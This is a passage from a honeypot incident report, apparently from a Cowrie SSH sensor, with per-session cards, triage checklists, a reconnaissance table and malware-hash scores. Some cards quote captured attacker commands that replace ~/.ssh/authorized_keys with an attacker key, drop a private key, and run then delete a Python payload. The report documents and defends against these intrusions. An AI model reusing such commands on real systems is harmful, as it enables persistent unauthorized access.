- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b26eeb5ac9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:26 |
| **Last Seen** | 2026-08-25 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:26:00` | `cowrie.session.connect` |
| `2026-08-25 16:26:00` | `cowrie.client.version` |
| `2026-08-25 16:26:00` | `cowrie.client.kex` |
| `2026-08-25 16:26:01` | `cowrie.login.success` |
| `2026-08-25 16:26:02` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:26:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:26:02` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4f5a54f433

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-25 16:29 |
| **Last Seen** | 2026-08-25 16:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:29:09` | `cowrie.session.connect` |
| `2026-08-25 16:29:09` | `cowrie.client.version` |
| `2026-08-25 16:29:09` | `cowrie.client.kex` |
| `2026-08-25 16:29:09` | `cowrie.login.success` |
| `2026-08-25 16:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029dc9fb7fcb

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-25 16:29 |
| **Last Seen** | 2026-08-25 16:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:29:11` | `cowrie.session.connect` |
| `2026-08-25 16:29:11` | `cowrie.client.version` |
| `2026-08-25 16:29:11` | `cowrie.client.kex` |
| `2026-08-25 16:29:11` | `cowrie.login.success` |
| `2026-08-25 16:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23678d709cf

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-25 16:29 |
| **Last Seen** | 2026-08-25 16:31 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:29:11` | `cowrie.session.connect` |
| `2026-08-25 16:29:11` | `cowrie.client.version` |
| `2026-08-25 16:29:11` | `cowrie.client.kex` |
| `2026-08-25 16:29:11` | `cowrie.login.success` |
| `2026-08-25 16:29:12` | `cowrie.session.file_upload` |
| `2026-08-25 16:29:13` | `cowrie.session.params` |
| `2026-08-25 16:29:13` | `cowrie.command.input` |
| `2026-08-25 16:29:13` | `cowrie.command.input` |
| `2026-08-25 16:29:13` | `cowrie.command.input` |
| `2026-08-25 16:29:13` | `cowrie.command.failed` |
| `2026-08-25 16:29:13` | `cowrie.log.closed` |
| `2026-08-25 16:29:14` | `cowrie.session.params` |
| `2026-08-25 16:29:14` | `cowrie.command.input` |
| `2026-08-25 16:29:14` | `cowrie.log.closed` |
| `2026-08-25 16:29:15` | `cowrie.session.params` |
| `2026-08-25 16:29:15` | `cowrie.command.input` |
| `2026-08-25 16:29:15` | `cowrie.log.closed` |
| `2026-08-25 16:29:16` | `cowrie.session.params` |
| `2026-08-25 16:29:16` | `cowrie.command.input` |
| `2026-08-25 16:29:16` | `cowrie.command.failed` |
| `2026-08-25 16:29:16` | `cowrie.command.failed` |
| `2026-08-25 16:30:17` | `cowrie.session.params` |
| `2026-08-25 16:30:17` | `cowrie.command.input` |
| `2026-08-25 16:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b781de589420

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:35 |
| **Last Seen** | 2026-08-25 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:35:19` | `cowrie.session.connect` |
| `2026-08-25 16:35:19` | `cowrie.client.version` |
| `2026-08-25 16:35:19` | `cowrie.client.kex` |
| `2026-08-25 16:35:20` | `cowrie.login.success` |
| `2026-08-25 16:35:20` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:35:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:35:21` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c129e2612f6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:35 |
| **Last Seen** | 2026-08-25 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:35:23` | `cowrie.session.connect` |
| `2026-08-25 16:35:23` | `cowrie.client.version` |
| `2026-08-25 16:35:23` | `cowrie.client.kex` |
| `2026-08-25 16:35:24` | `cowrie.login.success` |
| `2026-08-25 16:35:24` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:35:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:35:25` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5be02eec0c15

| Field | Detail |
|---|---|
| **Source IP** | `107.155.48[.]46` |
| **First Seen** | 2026-08-25 16:40 |
| **Last Seen** | 2026-08-25 16:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:40:57` | `cowrie.session.connect` |
| `2026-08-25 16:41:04` | `cowrie.client.version` |
| `2026-08-25 16:41:04` | `cowrie.client.kex` |
| `2026-08-25 16:41:06` | `cowrie.login.success` |
| `2026-08-25 16:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.48[.]46` to AbuseIPDB if not already reported
- [ ] Block `107.155.48[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01fffb3ab6ef

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-25 16:41 |
| **Last Seen** | 2026-08-25 16:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:41:07` | `cowrie.session.connect` |
| `2026-08-25 16:41:07` | `cowrie.client.version` |
| `2026-08-25 16:41:07` | `cowrie.client.kex` |
| `2026-08-25 16:41:08` | `cowrie.login.success` |
| `2026-08-25 16:41:09` | `cowrie.session.params` |
| `2026-08-25 16:41:09` | `cowrie.command.input` |
| `2026-08-25 16:41:09` | `cowrie.session.file_download` |
| `2026-08-25 16:41:09` | `cowrie.session.file_download` |
| `2026-08-25 16:41:09` | `cowrie.log.closed` |
| `2026-08-25 16:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d414fda15507

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:44 |
| **Last Seen** | 2026-08-25 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:44:59` | `cowrie.session.connect` |
| `2026-08-25 16:44:59` | `cowrie.client.version` |
| `2026-08-25 16:44:59` | `cowrie.client.kex` |
| `2026-08-25 16:45:00` | `cowrie.login.success` |
| `2026-08-25 16:45:00` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:45:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:45:00` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab4757e752e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:45 |
| **Last Seen** | 2026-08-25 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:45:03` | `cowrie.session.connect` |
| `2026-08-25 16:45:03` | `cowrie.client.version` |
| `2026-08-25 16:45:03` | `cowrie.client.kex` |
| `2026-08-25 16:45:04` | `cowrie.login.success` |
| `2026-08-25 16:45:04` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:45:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:45:04` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-375b8e697853

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]0` |
| **First Seen** | 2026-08-25 16:51 |
| **Last Seen** | 2026-08-25 16:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:51:00` | `cowrie.session.connect` |
| `2026-08-25 16:51:00` | `cowrie.client.version` |
| `2026-08-25 16:51:01` | `cowrie.client.kex` |
| `2026-08-25 16:51:02` | `cowrie.login.success` |
| `2026-08-25 16:51:03` | `cowrie.session.params` |
| `2026-08-25 16:51:03` | `cowrie.command.input` |
| `2026-08-25 16:51:03` | `cowrie.command.failed` |
| `2026-08-25 16:51:03` | `cowrie.log.closed` |
| `2026-08-25 16:51:04` | `cowrie.session.params` |
| `2026-08-25 16:51:04` | `cowrie.command.input` |
| `2026-08-25 16:51:04` | `cowrie.session.file_download` |
| `2026-08-25 16:51:04` | `cowrie.log.closed` |
| `2026-08-25 16:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]0` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]0` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb1c53cc3c8f

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]0` |
| **First Seen** | 2026-08-25 16:51 |
| **Last Seen** | 2026-08-25 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:51:04` | `cowrie.session.connect` |
| `2026-08-25 16:51:04` | `cowrie.client.version` |
| `2026-08-25 16:51:05` | `cowrie.client.kex` |
| `2026-08-25 16:51:06` | `cowrie.login.success` |
| `2026-08-25 16:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]0` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-134d0ec85165

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]0` |
| **First Seen** | 2026-08-25 16:51 |
| **Last Seen** | 2026-08-25 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:51:06` | `cowrie.session.connect` |
| `2026-08-25 16:51:06` | `cowrie.client.version` |
| `2026-08-25 16:51:06` | `cowrie.client.kex` |
| `2026-08-25 16:51:07` | `cowrie.login.success` |
| `2026-08-25 16:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]0` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32b939286349

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:54 |
| **Last Seen** | 2026-08-25 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:54:33` | `cowrie.session.connect` |
| `2026-08-25 16:54:33` | `cowrie.client.version` |
| `2026-08-25 16:54:34` | `cowrie.client.kex` |
| `2026-08-25 16:54:34` | `cowrie.login.success` |
| `2026-08-25 16:54:35` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:54:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:54:35` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626cfae31efe

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:54 |
| **Last Seen** | 2026-08-25 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:54:37` | `cowrie.session.connect` |
| `2026-08-25 16:54:37` | `cowrie.client.version` |
| `2026-08-25 16:54:37` | `cowrie.client.kex` |
| `2026-08-25 16:54:38` | `cowrie.login.success` |
| `2026-08-25 16:54:38` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:54:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:54:38` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]44` | **24** | 2026-08-25 14:55 | 2026-08-25 16:54 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-25 15:01 | 2026-08-25 16:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `134.209.229[.]23` | **3** | 2026-08-25 16:13 | 2026-08-25 16:25 | 2m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | **3** | 2026-08-25 15:07 | 2026-08-25 15:23 | 6m | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | **2** | 2026-08-25 16:03 | 2026-08-25 16:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-25 15:18 | 2026-08-25 16:18 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `181.229.24[.]230` | **2** | 2026-08-25 15:41 | 2026-08-25 15:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-08-25 14:55 | 2026-08-25 14:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.229.248[.]147` | **2** | 2026-08-25 16:43 | 2026-08-25 16:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.99.171[.]47` | 1 | 2026-08-25 15:55 | 2026-08-25 15:56 | 14s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `153.67.39[.]248` | 1 | 2026-08-25 15:50 | 2026-08-25 15:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.232.61[.]133` | 1 | 2026-08-25 16:19 | 2026-08-25 16:19 | 3s | 0 | `T1592` | 🟢 LOW |
| `188.252.196[.]46` | 1 | 2026-08-25 16:33 | 2026-08-25 16:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-25 15:35 | 2026-08-25 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `68.51.134[.]27` | 1 | 2026-08-25 15:46 | 2026-08-25 15:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-08-25 16:13 | 2026-08-25 16:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-25 16:12 | 2026-08-25 16:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]95` | 1 | 2026-08-25 16:20 | 2026-08-25 16:20 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
